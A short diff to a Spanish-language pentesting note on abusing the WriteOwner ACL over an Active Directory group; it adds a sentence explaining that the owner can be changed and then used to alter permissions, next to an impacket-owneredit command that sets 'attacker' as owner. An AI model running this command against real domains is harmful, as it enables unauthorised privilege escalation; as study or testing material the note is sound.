@@ -4,6 +4,8 @@ Tags: #AD #ACL #Linux #Impacket
 
 ## WriteOwner sobre Grupo 
 
+Si tenemos esta ACL sobre un **Group**, podemos **cambiar el propietario del grupo** y posteriormente utilizar ese control para modificar sus permisos.
+
 ```bash 
 # Cambiar la propiedad del objeto 
 ❯ impacket-owneredit -action write -new-owner 'attacker' -target 'victim' 'Domain'/'ControlledUser':'password'
